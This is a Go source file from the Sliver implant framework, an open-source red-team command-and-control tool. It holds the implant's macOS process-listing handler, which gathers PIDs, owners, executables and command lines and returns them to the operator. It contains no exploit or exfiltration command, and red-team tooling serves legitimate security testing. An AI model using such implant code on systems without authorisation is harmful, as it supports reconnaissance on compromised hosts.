package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/ps"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

func psHandler(data []byte, resp RPCResponse) {
	psListReq := &sliverpb.PsReq{}
	err := proto.Unmarshal(data, psListReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	procs, err := ps.Processes(psListReq.FullInfo)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to list procs %v", err)
		// {{end}}
	}

	psList := &sliverpb.Ps{
		Processes: []*commonpb.Process{},
	}

	for _, proc := range procs {
		p := &commonpb.Process{
			Pid:          int32(proc.Pid()),
			Ppid:         int32(proc.PPid()),
			Executable:   proc.Executable(),
			Owner:        proc.Owner(),
			Architecture: proc.Architecture(),
		}
		p.CmdLine = proc.(*ps.DarwinProcess).CmdLine()
		psList.Processes = append(psList.Processes, p)
	}
	data, err = proto.Marshal(psList)
	resp(data, err)
}
